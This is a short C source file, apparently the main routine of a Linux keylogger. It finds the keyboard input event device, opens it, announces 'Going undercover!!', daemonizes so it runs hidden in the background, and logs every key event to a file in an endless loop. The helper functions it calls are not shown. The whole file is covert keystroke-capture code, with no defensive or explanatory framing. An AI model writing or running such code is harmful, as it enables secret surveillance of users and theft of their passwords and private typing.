#include "main.h"

int main(void) {
  errno = 0;
  struct input_event ev;
  char* kbd = get_me_a_keyboard(); // Search for keyboard event file
  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path

  int fd = open(kbd_path, O_RDONLY);
  if(fd == -1)
  {
    printf("Error %d\n", errno);
    exit(EXIT_FAILURE);
  }
  printf("Reading from %s\n",kbd);
  free(kbd_path); // free some memory


  printf("Going undercover!!\n");
  daemonize(); // daemonize the process

  while (1)
  {
    read(fd, &ev, sizeof(struct input_event));
    if(ev.type == 1)
      log_in_file(ev);
  }

  return 0;
}
